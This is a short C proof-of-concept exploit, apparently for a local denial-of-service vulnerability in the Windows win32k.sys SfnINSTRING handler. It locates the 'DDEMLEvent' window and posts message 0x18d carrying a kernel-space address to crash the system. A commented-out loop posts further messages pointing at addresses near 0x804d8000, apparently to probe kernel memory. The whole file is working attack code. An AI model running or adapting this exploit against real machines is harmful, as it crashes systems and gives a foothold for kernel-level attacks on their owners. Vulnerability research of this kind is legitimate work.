#include "stdio.h"
#include "windows.h"
int main(int argc, char* argv[])
{
	char title[MAX_PATH]={0};

	printf("Microsoft Windows Win32k.sys SfnINSTRING Local D.O.S Vuln\nBy MJ0011\nth_decoder@126.com\nPressEnter");
	 
	HWND hwnd = FindWindow("DDEMLEvent" , NULL); 
	if (hwnd == 0 )
	{
		printf("cannot find DDEMLEvent Window!\n");
		return 0 ; 
	}

	GetWindowText(hwnd,title,MAX_PATH);
	printf("hwnd=%08X title=%s\n",hwnd,title);
	getchar();
	
	PostMessage(hwnd , 0x18d , 0x0 , 0x80000000);


// 	//0x804d8000 
// 	char buf[100]={0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x80,0x4d,0x80,0x00, 0x00,0x00,0x00,0x00,
// 				   0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00};
// 
// 
// 	//PostMessage(hwnd , 0x18d , (WPARAM)0x88888888 , (LPARAM)&buf); 
// 	for(int i=0;i<100;i++)
// 	{
// 		PostMessage(hwnd , 0x18d , (WPARAM)0x88888888 , (LPARAM)0x804d8000+i); 
// 	}
	
	return 0 ;
}
